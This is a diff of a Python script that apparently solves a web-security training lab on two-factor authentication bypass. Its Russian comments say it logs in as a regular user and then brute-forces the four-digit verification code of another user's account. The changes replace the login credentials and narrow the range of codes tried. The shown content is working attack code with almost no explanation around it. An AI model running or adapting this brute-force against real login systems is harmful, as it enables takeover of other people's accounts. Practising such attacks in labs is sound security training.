@@ -5,8 +5,8 @@ s = requests.Session()
 url = 'http://lap3-2fa_bypass_weak_logic.labs-is-here.online' 
 # 1. Получаем сессию: логинимся обычным пользователем
 login_data = {
-    'username': 'laplas',   # логин существующего пользователя
-    'password': '123123'
+    'username': 'testuser',   # логин существующего пользователя
+    'password': 'testpass'
 }
 # r = s.post('http://lap3-2fa_bypass_weak_logic.labs-is-here.online/login', data=login_data)
 r = s.post(f'{url}/login', data=login_data)
@@ -17,7 +17,7 @@ assert r.status_code == 200 or r.status_code == 302  # редирект на /lo
 
 print('assert passed')
 # 2. Теперь брутфорсим verif_code для чужого пользователя
-for code in range(10000):
+for code in range(2000, 3000, 1):
     code_str = f'{code:04d}' 
     data = {
         'verif_code': code_str,
